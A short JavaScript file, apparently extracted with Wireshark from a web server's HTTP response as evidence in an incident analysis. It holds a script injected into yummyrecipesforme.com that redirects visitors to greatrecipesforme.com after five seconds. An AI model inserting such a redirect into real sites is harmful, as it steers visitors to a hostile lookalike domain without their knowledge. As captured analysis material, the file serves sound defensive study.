// malicious.js
// Извлечено из HTTP-ответа yummyrecipesforme.com (200 OK)
// Wireshark → Follow → HTTP stream → Save as...

setTimeout(function(){
    location.href = "http://greatrecipesforme.com/";
}, 5000);
